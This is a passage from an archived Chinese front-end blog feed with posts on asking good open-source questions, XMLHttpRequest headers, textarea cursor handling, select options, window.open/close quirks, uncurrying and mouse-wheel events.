中找到很多信息。求助身边的朋友如果你使用的开源软件，在朋友圈或同事圈里也有人使用，那么抬起你的脚、或拿起你的电话，真挚诚恳的探讨不会遭遇拒绝，而会增进友谊。不要犹豫，你的内心渴望面对面交流，你的朋友也是。如果以上 4 步都无法解决你遇到的问题，也别犹豫，立马向开源社区提交问题就好。提问时提问有很多种，比如你认识作者，直接面对面请教就行。下面探讨的是如何通过互联网的方式来问问题。平和对等的心态很多开源软件都是免费的，作者往往是业余时间出于兴趣在维护，没有义务回答社区问题。提问时，不要把自己摆在顾客的位置，比如项目马上要上线了，请务必帮忙解决 这是我的邮箱，请及时联系我另外，也不要把自己摆在乞食者的位置，比如冰天雪地跪求解答 救命啊，我的网站挂了在开源社区，一切皆是朋友。无论对方是 Linux 内核的作者，还是某个 jQuery 插件的作者，你和作者都是对等的。你的提问是在帮助开源软件完善。平和对等的心态，可以让你的问题赢得更多人的阅读和思考。通过正确的途径提交如果遇到问题的开源软件有专门的 Bug 管理系统，请最好到这些指定系统中提交。比如，对于前端开发工程师来说，下面这些 Tracker 系统很重要。jQuery TicketsWebKit BugzillaMozilla Bugzilla还有各个开源类库的 Issues 库，比如 Sea.js 的是：seajs/issues最不好的途径是QQ 、阿里旺旺、微信等群组。这些群组主要是用来工作或休闲的。对开源项目来说，在这些地方提问，作者一般不会关注，效率非常低。微博、Facebook 等社交网络。不少人在微博上通过 at 或私信询问 Sea.js 问题，这些我经常看不到。看到了，也不情愿回复。微博是扯淡、交流情感的地方，一般是写代码写累了，才去逛逛，很少会有在社交网络上回答技术问题的心情。通过正确的途径提交问题，一般可以让你的问题得到及时准确的回复。使用明确、有意义的标题抱着平和对等的心态，找到合适的途径后，就得静下心来将遇到的问题写成文字。书写文字不是一件简单的事情，我们可以从遵循一些简单的规则开始。首先是标题要简洁清晰，要言之有物。比如我遇到了一个 Ajax 问题 Sea.js 在我的浏览器上运行不了上面的标题很糟糕，光看标题作者无法知道发生了什么事。当开源社区的问题很多时，上面这类标题，经常会让作者直接忽视或将优先级降到很低。更妥当的标题是Ajax 请求未返回正确的 responseXML Sea.js 2.0 在 IE6 上运行时抛错明确、有意义的标题，可以帮助作者确定问题具体是什么类型、预估需要多少时间解决、是否现在马上解决等。一个好的标题，也有利于社区知识的沉淀和后期搜索。标题有如一个人的颜面衣着，虽然不是关键，但在嘈杂的信息社区中，这很重要。遵循良好的模板如果社区提供了问题模板，一定要仔细看下。比如 Google Code 社区，当你创建一个问题时，会自动提供以下模板： 1234567891011121314What steps will reproduce the problem?该问题的重现步骤是什么？1.2.3.What is the expected output? What do you see instead?你期待的结果是什么？实际看到的又是什么？What version of the product are you using? On what operating system?你正在使用产品的哪个版本？在什么操作系统上？Please provide any additional information below.如果有的话，请在下面提供更多信息。 遵循这个模板去描述问题，经常能省很多事。作者一般也非常欢迎通过模板提交的问题。如果社区没有提供模板，也可以自己遵循以上模板来提交。下面针对问题内容，具体说说一些需要注意的点。语法正确、格式清晰虽然我们不是作家，但正确的语法、清晰的格式，可以让读者赏心悦目，也就更有心情帮你一起思考解决问题。对于很多需要代码来描述的问题，要尤其注意格式，比如 1seajs.use(&apos;jquery&apos;,function($)&#123;$(document).ready(function() &#123; /* ... */ &#125;)&#125;); 可读性不如12345seajs.use(&apos;jquery&apos;, function($) &#123; $(document).ready(function() &#123; // ... &#125;);&#125;);GitHub 的 Markdown 语法可以很好地支持代码排版、语法高亮等，建议书写代码时，一定要先阅读下说明：GitHub Flavored Markdown。这能让你的内容看起来很专业，社区也就更有意愿会去帮助你，否则糟糕的排版，经常带来的是发帖之后的石沉大海。描述事实、而不是猜测事实是指，依次进行了哪些操作、产生了怎样的结果。比如我在 Windows XP 下用 IE6 打开&nbsp;seajs.org&nbsp;后，点击\5 分钟上手 Sea.js”，这时浏览器弹出脚本错误提示，例子显示不正确。上面是一段比较好的事实描述（更好的是把错误提示也截图上来），而不要像下面这样猜测：Sea.js 在 IE6 下运行不正常，我怀疑是源码第 213 行有问题。上面的描述，会让作者一头雾水、甚至很恼火。尽量避免猜测性描述，除非你能先描述事实，在事实描述清楚之后，再给出合理的猜测是欢迎的。对于前端项目来说，如果能提供可重现错误的在线可访问代码，那是最好不过的。一旦你这么用心去做了，作者往往也会很用心地立马帮你解决。描述目标、而不是过程经常会有这种情况，提问者在脑袋里有个更高层次的目标，他们在自以为能达到目标的特定道路上卡住了，然后跑来问该怎么走。比如Sea.js 的 parseMap 方法在遇到 map 的多个配置项同时匹配同一个路径时，应该允许用户指定是全部生效还是仅第一个匹配的配置项生效。上面这个问题的背后，提问者实际上想解决的是如何通过 Sea.js 来做版本管理。提问者选择了通过 map 的方式来实现，但这过程中遇到了问题，因此跑过来继续怎么走。然而，如果只是描述过程，往往会把作者也绕进去。实际情况却是，提问者选择的路本身就是一条崎岖之路，对于要解决的问题，实际上有更好的方式。这种情况下，描述清楚目标，讲清楚要干什么非常重要。在描述自己是怎么做之前，一定要先描述要做什么。提问题时，What 往往比 How 更重要。要有具体场景无论在开源社区，还是微博、知乎等平台上，有一种非常常见的问题：如何维护 JavaScript 代码？ 如何使用 Sea.js 进行模块化开发？这类问题还有很多，每每遇到，只能笑笑，然后悄悄地忽略掉。因此这类问题很难回答，就如下面这些问题一样：如何才能让生命有意义？ 如何打败淘宝？这类提问者，一般比较浮躁，经常对问题本身也没有经过思考。踏实的提问者，不会让问题浮在空中无法回答，而会在具体场景中让问题落地：我的项目有 20 多个 JS 文件，接下来还会急剧增加。目前遇到以下问题……（省略五百字）…… 请问如何维护？仔细检查、确保准确是人都会犯错误，特别是在如此快节奏的互联网环境下。好不容易把问题描述清楚时，不要急着立刻提交。在提交前，至少保证从头到尾再仔细阅读一遍，比如语法错误、错别字、标点符号、排版等等。做到这些，不光是尊重别人，也是尊重自己。提问后提交问题后，建议通过邮件等方式订阅回复。互联网上最有效的沟通方式是异步沟通，不要期待作者马上回复，也不要心烦意乱着急地等待。出去看看天，数数云朵，你会逐步明白什么是风轻云淡。尽可能补充信息在接收到回复时，仔细阅读。最经常的情况是，社区回复的，经常不是你想要的。比如根据你的描述，问题无法重现。能否提供具体使用环境和重现步骤？这时要淡定。仔细看看自己提交的问题描述是否足够清晰，如果有可补充的信息，尽量补充，以帮助作者能尽快定位问题。比如很抱歉，我前面有一步描述不正确，实际情况是我是在 IETester 中运行的……谦和淡定的交流，不光能帮助你解决问题，还有助于你结交更多朋友。适当的总结当问题终于解决时，建议对问题进行总结。可以编辑原帖，也可以通过博客等方式总结。你的总结，会让遇到同样问题的朋友们受益，并且对自己的技能也是一种提高。前端业界，无论国内还是国外，有很多牛人之所以成为牛人，很大程度上都是因为有总结思考的好习惯。不要忘记感谢最后，记得感谢。很多开源软件的作者，都是利用业余时间在创作代码。你的感谢，汇集许许多多大家的感谢，会让开源社区充满爱与力量。延伸阅读如何有效地报告 Bug提问的智慧回答的智慧最后的最后，如果你认可这篇文章，欢迎以各种形式转载。你的传播，能让整个开源社区更美好。 本文转自：github]]></content>
      <categories>
        <category>剪贴板</category>
        <category>观点和感想</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
        <tag>学会提问</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[利用XMLHttpRequest响应头部的Date来做倒计时]]></title>
    <url>%2Fblog%2F2013%2F04%2F13%2F2013-04-13-cb-readyState_3_interactive%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. 关键词：倒计时 XMLHttpRequest readyState Date AJAX Problem [问题描述]先看看这个：（搜狗团购网站）还剩多久多久，这个东西你是怎么做的。不推荐方案脑残方案一： 把截止时间保存到cookie中，然后与现在时间做差值，进行比较。 方案评价： 1. 如果用户cookie没开怎么办？ 2. cookie不宜过多，cookie过期管理等麻烦！脑残方案二： 把服务器的本地时间作为参数送到客户端，然后js相关处理 方案评价： 因网络延迟等原因存在误差屌丝看完变高富帅^_^ &nbsp;先给你看一张图：（向服务器请求的某个任意文件）好像有的同学瞬间就懂了。是的，在请求头中就包含了服务器的标准时间。那么下一步就是怎么获取这个Date。XMLHttpRequert我们知道在XMLHttpRequest中用readyState来表示相应状态。0 （未初始化）对象已建立，但是尚未初始化（尚未调用open方法）1 （初始化）对象已建立，尚未调用send方法2 （发送数据）send方法已调用，但是当前的状态及http头未知3 （数据传送中）已接收部分数据，因为响应及http头不全，这时通过responseBody和responseText获取部分数据会出现错误，4 （完成）数据接收完毕，此时可以通过通过responseBody和responseText获取完整的回应数据大家可能很少用到readyState为3这个状态，那么这个问题，就要用到他了。Solution [解决方案] 123456789101112&lt;script type=&quot;text/javascript&quot;&gt; var xhr = new XMLHttpRequest(); xhr.open(&apos;get&apos;, &apos;testServer.txt&apos;, true); //这里的testServer.txt，其实我没有创建，完全可以不需要这个文件，我们只是要时间罢了 xhr.onreadystatechange = function()&#123; if(xhr.readyState == 3)&#123; //状态3响应 var header = xhr.getAllResponseHeaders(); //获得所有的头信息 console.log(header);//会弹出一堆信息 console.log(xhr.getResponseHeader(&apos;Date&apos;)); //弹出时间，那么可以利用获得的时间做倒计时程序了。 &#125; &#125; xhr.send(null);&lt;/script&gt; 上面看着懂大概的意思就行哈~注：上述代码IE9以下版本不兼容，不清楚的童鞋自己百度AJAX兼容性等关键词。 Reference [参考资料] 1. Exodia 2. 百度文库]]></content>
      <categories>
        <category>JavaScript</category>
        <category>网络交互</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
        <tag>XMLHttpRequest</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScript操控光标，你会么？]]></title>
    <url>%2Fblog%2F2013%2F04%2F11%2F2013-04-11-cb-set_and_get_cursor_position%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. QQ群里经常有人问怎么设置textarea中光标的位置，所见即所得中如果选中文本。如果你也不会，请往下看：关键词：javascript 光标 位置 鼠标取词 createRange getSelection getPosition先上代码，你也可以测试下效果。123456789101112131415161718192021222324252627282930313233343536373839404142434445464748&lt;!DOCTYPE HTML&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;测试&lt;/title&gt; &lt;style type=&quot;text/css&quot;&gt; &lt;/style&gt; &lt;script type=&quot;text/javascript&quot;&gt; //&lt;![[ function getPosition() &#123; var startPos = endPos = 0; var element = document.getElementById(&quot;box&quot;); if( document.selection ) &#123; var range = document.selection.createRange(); var drange = range.duplicate(); drange.moveToElementText( element ); drange.setEndPoint( &quot;EndToEnd&quot;, range ); startPos = drange.text.length - range.text.length; endPos = startPos + range.text.length; &#125;else if( window.getSelection ) &#123; startPos = element.selectionStart; endPos = element.selectionEnd; &#125; return &#123; &quot;start&quot; : startPos, &quot;end&quot; : endPos &#125; &#125; window.onload = function()&#123; var element = document.getElementById(&quot;box&quot;); element.onmouseup = function()&#123; var pos = getPosition(), val = element.value.toString(); console.log(val.substring(pos.start, pos.end) || &quot;没有选中&quot;); &#125; &#125; //]]&gt; &lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;textarea id=&quot;box&quot;&gt;木子Vs立青，性别男，爱好女，单身。&lt;/textarea&gt;&lt;/body&gt;&lt;/html&gt;// &lt;![CDATA[function getPosition() { var startPos = endPos = 0; var element = document.getElementById(“skyking-box”); if (document.selection) { var range = document.selection.createRange(); var drange = range.duplicate(); drange.moveToElementText(element); drange.setEndPoint(“EndToEnd”, range); startPos = drange.text.length - range.text.length; endPos = startPos + range.text.length; } else if (window.getSelection) { startPos = element.selectionStart; endPos = element.selectionEnd; } return { “start”: startPos, “end”: endPos }}function log(str) { var lb = document.getElementById(“skyking-log-box”); lb.innerHTML = lb.innerHTML + “&gt; “ + str;}function showLog() { var pos = getPosition(), val = element.value.toString(); log(val.substring(pos.start, pos.end) || “没有选中”);};// ]]&gt;selection &lt;&nbsp;getSelectionIE下的选择方式：判断方式（document.selection）123456//获取选取var range = document.selection.createRange();var drange = range.duplicate();drange.moveToElementText( element );drange.setEndPoint( &quot;EndToEnd&quot;, range );//获取positionstartPos = drange.text.length - range.text.length;endPos = startPos + range.text.length;比较啰嗦，这代码也没啥意思，看了就忘，所以得多看多写，熟练了就好了。下面是非IE的选择方式：判断方式（window.getSelection）12startPos = element.selectionStart;endPos = element.selectionEnd;简练多了，是吧~设置光标位置这个就比较简单了，把 start 和 end 的值设置成一样就搞定了！chrome下：123element.selectionStart = 5;element.selectionEnd = 5;element.focus();IE下：12345var range = document.selection.createRange();range.collapse(true);range.moveEnd(&apos;character&apos;, 5);range.moveStart(&apos;character&apos;, 5);element.focus();给他们一个focus的目的就是为了聚焦到textarea上去，以便清晰看到光标已经成功设置了。Demo我就不写了，相信应该有了大概的了解。写个Class，方便使用 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061var getObj = function ( id ) &#123; //获取对象 var ele = document.getElementById(id); //返回结果 return &#123; element: ele, startPos: 0, endPos: 0, init: function()&#123; var _this = this; if( !(&quot;__proto__&quot; in &#123;&#125;) )&#123; this.element.attachEvent(&quot;onmouseup&quot;, _this.getPos); &#125;else&#123; this.element.addEventListener(&quot;mouseup&quot;, _this.getPos, false); &#125; return this; &#125;, getPos: function () &#123; var _this = this; if( document.selection ) &#123; try&#123; var range = document.selection.createRange(); var drange = range.duplicate(); drange.moveToElementText( _this.element ); drange.setEndPoint( &quot;EndToEnd&quot;, range ); this.startPos = drange.text.length - range.text.length; this.endPos = this.startPos + range.text.length; &#125;catch(e)&#123; &#125; &#125;else if( window.getSelection )&#123; try&#123; this.startPos = this.element.selectionStart; this.endPos = this.element.selectionEnd; &#125;catch(e)&#123; //throw new Error(&quot;getPos error&quot;); &#125; &#125; return this; &#125;, setPos: function ( m, n ) &#123; var arg2 = n || m; if( document.selection ) &#123; var range = document.selection.createRange(); range.collapse(true); range.moveEnd(&apos;character&apos;, arg2); range.moveStart(&apos;character&apos;, m); this.element.focus(); &#125;else if( window.getSelection )&#123; this.startPos = this.element.selectionStart = m; this.endPos = this.element.selectionEnd = arg2; this.element.focus(); &#125; &#125;, getStr: function( m, n )&#123; this.getPos( m, n ); return this.element.value.toString().slice(this.startPos, this.endPos); &#125; &#125;;&#125;; 很受伤，下次接着弄。你也可以试试哈~函数调用方式：1. 初始化init() 1var t = getObj(&quot;box&quot;).init(); 2. setPos() 1234//选中从m到n之间的内容t.setPos(m, n);//一个参数就是设置光标位置t.setPos(m); 3. getPos() 12//这个算是一个内置函数，每次选择都自动调用了，可以不管t.getPos(); 4. getStr() 12//获取选中的字符串t.getStr(); 5. invoke() 1234//执行你送入的函数function yourFun()&#123;&#125;//这个方法还没加进去，感觉用处也不大，原理就是使用callt.invoke(yourFun); 主要是不很了解IE的API，纠结了半天，又不愿意去看别人写的文档，先晾在这里，下次不全~本文未完，待续…]]></content>
      <categories>
        <category>JavaScript</category>
        <category>杂物间</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[摸透select和他的儿子们options]]></title>
    <url>%2Fblog%2F2013%2F04%2F11%2F2013-04-11-cb-options_add_and_remove%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. 关键词：select option options selectedIndex remove add关于select的→API，自己去看，不多说了。 select &lt; option &lt; optgroupoptgroup就是起到一个分组的作用。1234567891011121314151617181920212223242526272829&lt;!--common--&gt;&lt;select id=&quot;s1&quot;&gt; &lt;option value=&quot;--s--&quot; selected=&quot;selected&quot;&gt;----select----&lt;/option&gt; &lt;option value=&quot;1&quot;&gt;1&lt;/option&gt; &lt;option value=&quot;2&quot;&gt;2&lt;/option&gt; &lt;option value=&quot;3&quot;&gt;3&lt;/option&gt; &lt;option value=&quot;4&quot;&gt;4&lt;/option&gt; &lt;option value=&quot;5&quot;&gt;5&lt;/option&gt;&lt;/select&gt;&lt;!--multiple--&gt;&lt;select multiple id=&quot;s2&quot;&gt; &lt;option value=&quot;1&quot;&gt;1&lt;/option&gt; &lt;option value=&quot;2&quot;&gt;2&lt;/option&gt; &lt;option value=&quot;3&quot;&gt;3&lt;/option&gt; &lt;option value=&quot;4&quot;&gt;4&lt;/option&gt; &lt;option value=&quot;5&quot;&gt;5&lt;/option&gt;&lt;/select&gt;&lt;!--multiple+group--&gt;&lt;select multiple id=&quot;s3&quot;&gt; &lt;optgroup label=&quot;g1&quot;&gt; &lt;option value=&quot;1&quot; selected=&quot;selected&quot;&gt;1&lt;/option&gt; &lt;option value=&quot;2&quot;&gt;2&lt;/option&gt; &lt;option value=&quot;3&quot;&gt;3&lt;/option&gt; &lt;/optgroup&gt; &lt;optgroup label=&quot;g2&quot;&gt; &lt;option value=&quot;4&quot;&gt;4&lt;/option&gt; &lt;option value=&quot;5&quot;&gt;5&lt;/option&gt; &lt;/optgroup&gt;&lt;/select&gt;注：optgroup的属性用的是label，别搞错了。上面三个一次效果图为样式可以改，这个不多说。selectedIndex 写的时候别向我一样犯2，我经常写成selectIndex，然后纠结哪里错了。。 前面展示了两类，后者为multiple，按住Ctrl键可以多选，但是selectedIndex只能选中一个，所以multiple的select不适合用（尽管是允许用的）。12345var s1 = document.getElementById(&quot;s1&quot;)；s1.onchange = function()&#123; //如果你要写成this.options.selectedIndex，这也是没问题的 console.log( this.selectedIndex );&#125;添加option1.比较老的方法（兼容性不知道）：12var p = new Option(&quot;text&quot;,&quot;value&quot;,false,true);s1[s1.options.length] = p;new Option第一个参数顾名思义就行了，第三个指的是defaultSelected属性，就是默认选中，第四个指的是selected属性，就是要不要选中。兼容性不太清楚，不建议使用，而且四个参数过几天又忘了顺序或者涵义了。2.标准化的一些函数调用创建option1234var p = document.createElement(&quot;option&quot;); //创建一个Elementp.value = &quot;add&quot;; //添加属性 推荐p.setAttribute(&quot;value&quot;, &quot;add&quot;);p.appendChild(document.createTextNode(&quot;add&quot;)); //添加texts1.insertBefore(p, /*这里随便写的*/s1.firstChild); //插入P.S：我在chrome下测试，上述最后一句代码改成insertAfter报错，所以大家在使用的时候尽量用insertBefore。删除option 123var p = s1.item(2); //可以使用item来选择,也可以 //s1.getElementsByTagName(&quot;option&quot;)[2];p.parentElement.removeChild(p); //删除节点 z-index bug IE6 还有一个bug忘了说了，补上！在IE6下，select的z-index属性总是比其他的元素也高，也就是说，只要你搞一个模拟弹框，就会发现一个select傻傻的浮到弹框之上，或者遮罩层出现一个闪亮的select元素，颇为恶心。解决方案： 1. 极度屌丝，极度方便，极度省事，极度。。。。。把他隐藏！！！！，关闭弹出框之后再显示 2. iframe包裹 1234567&lt;iframe&gt; &lt;select name=&quot;me&quot;&gt; &lt;option value=&quot;name&quot;&gt;木子Vs立青&lt;/option&gt; &lt;option value=&quot;sex&quot;&gt;male&lt;/option&gt; &lt;option value=&quot;age&quot;&gt;20&lt;/option&gt; &lt;/select&gt; &lt;/iframe&gt; 只要这个iframe的z-index比你弹出层的z-index小就行了。 Reference 1.《JavaScript权威指南（第六版）》 2.&nbsp;聂微东]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
        <tag>options</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[打开窗口，关闭窗口]]></title>
    <url>%2Fblog%2F2013%2F04%2F10%2F2013-04-10-cb-window-open-and-close%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. 关键词：window.open() window.close() showModalDialog() 兼容性 测试等。 本文默认你对以上函数参数有基本了解。window.open window.open如果没有加第三个参数，则浏览器一般都会在新的标签页打开（除非你设置了新建窗口打开） 而有的时候，我们需要他弹出来。就想这个一样： 上述方式是： 1window.open(/*URL*/&quot;&quot;,/*Name*/&quot;&quot;,/*args*/&quot;width=300,height=400&quot;); 但是搜狗是不会挺你的话的，他不会新建一个你设定的窗口打开，而是在一个新的标签页打开。 这个，你就认了吧！如果不服气，你可以用下面的函数来解决。 showModalDialog 试了下，chrome、FF、IE下都能跳出一个模态框口出来。 1window.showModalDialog(&quot;&quot;,&quot;&quot;,&quot;dialogHeight=200,dialogWidth=300&quot;); 注意:这里的第三个参数有一些不同，加了个前缀dialog。 不过搜狗又有点变态了， 1.&nbsp;如果你的第一个参数不写，即为空时，弹不出来。 2. 如果第一个参数的URL地址和window.location不是同一个域内（什么是同域），则会这样： 会弹出一个存在安全隐患的提示，这个也是个烦人的东西，修改IE的安全项应该可以解决问题。这里不多说。 window.close 这个不用说，大家问题遇到最多的就是这个东西的bug。 1window.close() 如果单单是这一句话，IE（搜狗等）会弹出这么一个提示： FF和chrome无反应。如果加点东西： 1234567//第一步，如果该窗口是被他爸爸打开的，先断绝父子关系window.opener = null;//window.close()只允许关系自己打开的窗口//用一个空页面替换掉现在的页面var a = window.open(&quot;&quot;, &quot;_self&quot;);//然后关闭自己打开的页面a.close(); 效果还行，把chrome的页面给关闭了，IE的弹出框也没了，不过可恶的FF依然没有反应！！！抓狂！！！！ 干掉FireFox 我们退而求其次，既然关不掉你，我就把你换成一个空页面算了！ 1window.location.href=&quot;about:blank&quot;; 之所以window.close在firefox不能使用，是因为firefox默认不能关闭用户打开的网页。知道原因有个毛用，还是没办法把他kill掉。。。 有人说：我们可以这样设置firefox： 打开firefox,在地址栏输入about:config 找到dom.allow_scripts_to_close_windows这项并改为true。 这样就可以解决Firefox的问题了，但是，难道你打算让用户这么去干? 不过还是恳请大神们找一个完美解决window.close的方案，坐等！！！提供测试代码，省得你再打一次~ 12345678910111213141516171819202122232425262728293031323334353637&lt;!DOCTYPE HTML&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;测试&lt;/title&gt; &lt;script type=&quot;text/javascript&quot;&gt; //&lt;![[ function a()&#123; //window.opener = null var b = window.open(&quot;&quot;,&quot;asdfs&quot;,&quot;width=300,height=400&quot;); //window.showModalDialog(&quot;http://www.baidu.com&quot;,&quot;&quot;,&quot;dialogHeight=200,dialogWidth=300&quot;); b.location.href = &quot;./jQueryDemo.html&quot;; //alert(a.name) b.opener.getElmentById(&quot;i&quot;).focus(); //window.close(); //第一步，如果该窗口是被他爸爸打开的，先断绝父子关系 //window.opener = null; //window.close()只允许关系自己打开的窗口 //用一个空页面替换掉现在的页面 //var a = window.open(&quot;&quot;, &quot;_self&quot;); //然后关闭自己打开的页面 //a.close(); &#125; //]]&gt; &lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;ul onclick=&quot;a()&quot;&gt; &lt;li&gt;11111&lt;/li&gt; &lt;li&gt;22222&lt;/li&gt; &lt;li&gt;33333&lt;/li&gt; &lt;li&gt;44444&lt;/li&gt; &lt;/ul&gt; &lt;input type=&quot;text&quot; id=&quot;i&quot;&gt;&lt;/body&gt;&lt;/html&gt;]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javascript中有趣的反柯里化]]></title>
    <url>%2Fblog%2F2013%2F04%2F09%2F2013-04-09-cb-uncurrying%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. 相关阅读 1.JKisJK&nbsp; 2.月影 3.张鑫旭AlloyTeam作品反科里化的话题来自javascript之父Brendan Eich去年的一段twitter. 近几天研究了一下，觉得这个东东非常有意思，分享一下。先忘记它的名字，看下它能做什么.不要小看这个功能，试想下，我们在写一个库的时候，时常会写这样的代码，拿webQQ的Jx库举例。我们想要的，其实只是借用Array原型链上的一些函数。并没有必要去显式的构造一个新的函数来改变它们的参数并且重新运算。如果用uncurrying的方式显然更加优雅和美妙，就像这样：还能做很多有趣和方便的事情.甚至还能把call和apply方法都uncurrying，把函数也当作普通数据来使用. 使得javascript中的函数调用方式更像它的前生scheme, 当函数名本身是个变量的时候, 这种调用方法特别方便.scheme里面调用函数是这样:javascript里可以写的很接近.再看看jquery库，由于jquery对象( 即通过$()创建的对象 )是一个对象冒充的伪数组，它有length属性，并且能够通过下标查找对应的元素，当需要给jquery对象添加一个成员时, 伪代码大概是：如果用uncurrying的话, 就可以借用了array对象的push函数, 让引擎去自动管理数组成员和length属性.而且可以一次把需要的函数全部借过来, 一劳永逸. 一段测试代码:总的来说, 使用uncurrying技术, 可以让任何对象拥有原生对象的方法. 好了，如果到这里依然没有引起你的兴趣，那么你可以去干点别的了。接下来一步一步来看看原理以及实现。在了解反currying化这个奇怪的名字之前，我们得先搞清楚currying。维基百科上的定义：科里化( currying ); 又称部分求值，是把接受多个参数的函数变换成接受一个单一参数的函数，并且返回接受余下的参数并且返回结果的新函数的技术。通俗点讲，currying有点类似买房子时分期付款的方式，先给一部分首付( 一部分参数 )， 返回一个存折（ 返回一个函数 ），合适的时候再给余下的参数并且求值计算。来看看我们都用过的currying, 我们经常在绑定context 的时候实现一个Function.prototype.bind函数.高阶函数是实现currying的基础, 所谓高阶函数至少满足这2个特性：1， 函数可以当作参数传递，2， 函数可以作为返回值。Javascript在设计之初，参考了很多scheme语言的特性。而scheme是函数式语言鼻祖lisp的2大方言之一，所以javascript也拥有一些函数式语言的特性，包括高阶函数，闭包，lambda表达式等。当javascript中的函数返回另一个函数，此时会形成一个闭包，而在闭包中就可以保存第一次运算的参数，我们用这个思想，来写一个通用的currying函数。我们约定, 当传入参数时候, 继续currying化, 参数为空时才开始求值.假设在实现一个计算每月花费的函数, 每天结束前我们都要记录今天花了多少钱, 但我们只关心月底的花费总值, 无需每天都计算一次.使用currying函数, 便可以延迟到最后一刻才一起计算, 好处不言而喻, 在很多场合可以避免无谓的计算, 节省性能, 也是实现惰性求值的一种方案.好了，现在才走进正题，curring是预先填入一些参数.反curring就是把原来已经固定的参数或者this上下文等当作参数延迟到未来传递.其实就是搞这样一个事情，将：obj.foo( arg1 ) //foo本来是只在obj上的函数. 就像push原本只在Array.prototype上转化成这样的形式foo( obj, arg1 ) // 跟我们举的第一个例子一样.将[].push转换成push( [] )就像原本是接在电视插头上的插座，把它拆下来之后，其实也能用来接冰箱。Ecma上Array和String的每个原型方法后面都有这么一段话，比如push：NOTE The push function is intentionally generic; it does not require that its this value be an Array object.Therefore it can be transferred to other kinds of objects for use as a method. Whether the concat function can be applied. Javascript为什么要这样设计, 我们先来复习下动态语言中重要的鸭子类型思想.说个故事：很久以前有个皇帝喜欢听鸭子呱呱叫，于是他召集大臣组建一个一千只鸭子的合唱团。大臣把全国的鸭子都抓来了，最后始终还差一只。有天终于来了一只自告奋勇的鸡，这只鸡说它也会呱呱叫，好吧在这个故事的设定里，它确实会呱呱叫。 后来故事的发展很明显，这只鸡混到了鸭子的合唱团中。&mdash; 皇帝只是想听呱呱叫，他才不在乎你是鸭子还是鸡呢。 这个就是鸭子类型的概念，在javascript里面，很多函数都不做对象的类型检测，而是只关心这些对象能做什么。Array构造器和String构造器的prototype上的方法就被特意设计成了鸭子类型。这些方法不对this的数据类型做任何校验。这也就是为什么arguments能冒充array调用push方法.看下v8引擎里面Array.prototype.push的代码: 123456789function ArrayPush() &#123; var n = TO_UINT32( this.length ); var m = %_ArgumentsLength(); for (var i = 0; i &lt; m; i++) &#123; this[i+n] = %_Arguments(i); //属性拷贝 this.length = n + m; //修正length return this.length; &#125;&#125; 可以看到，ArrayPush方法没有对this的类型做任何显示的限制，所以理论上任何对象都可以被传入ArrayPush这个访问者。我们需要解决的只剩下一个问题， 如何通过一种通用的方式来使得一个对象可以冒充array对象。真正的实现代码其实很简单:这段代码虽然很短, 初次理解的时候还是有点费力. 我们拿push的例子看看它发生了什么. 12var push = Array.prototype.push.uncurrying();push( obj, &quot;first&quot; ); 本文转自：javascript中有趣的反柯里化]]></content>
      <categories>
        <category>JavaScript</category>
        <category>剪贴板</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
        <tag>柯里化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScript之鼠标滚动事件]]></title>
    <url>%2Fblog%2F2013%2F04%2F09%2F2013-04-09-cb-mousewheel%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. 最近正在做评论模块的image LazyLoad（图片资源延迟加载/按需加载），其中涉及到一些mouse scroll操作。老外的Mouse wheel programming in JavaScript一文，对我很有价值。&mdash;&mdash;以下为翻译&mdash;&mdash;本文有些信息可能已经过时，但是大部分知识点仍旧有用。Web应用日新月异，也越来越接近于桌面应用。功能上越来越强，比如drag&lt;drop（拖拽），autocompletition（自动完成/自动补全）等等。在AJAX的配合下，这些应用都易于实现。本文要说的并不是AJAX技术，而是关于相对简单的用户输入手段&mdash;&mdash;鼠标滚轮。目前已经很难找到不带滚轮的鼠标了，大多数用户会使用滚轮用来滚动浏览器、缩放页面/照片之类的操作。Web应用在这个领域却鲜有建树。本文将提供一些基于鼠标滚轮的javascript事件和相关的处理手段。Annotated code 带注释的代码下面是一段带注释的javascript代码，阐述鼠标滚动事件背后的一些原理。//此处不准备对代码注释进行翻译，查看源代码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162/** * This is high-level function. * It must react to delta being more/less than zero. */function handle(delta) &#123; if (delta &lt; 0) ...; else ...;&#125;/** * Event handler for mouse wheel event. */function wheel(event)&#123; var delta = 0; if (!event) /* For IE. */ event = window.event; if (event.wheelDelta) &#123; /* IE/Opera. */ delta = event.wheelDelta / 120; /** * In Opera 9, delta differs in sign as compared to IE. */ if (window.opera) delta = -delta; &#125; else if (event.detail) &#123; /** Mozilla case. */ /** * In Mozilla, sign of delta is different than in IE. * Also, delta is multiple of 3. */ delta = -event.detail / 3; &#125; /** * If delta is nonzero, handle it. * Basically, delta is now positive if wheel was scrolled up, * and negative, if wheel was scrolled down. */ if (delta) handle(delta); /** * Prevent default actions caused by 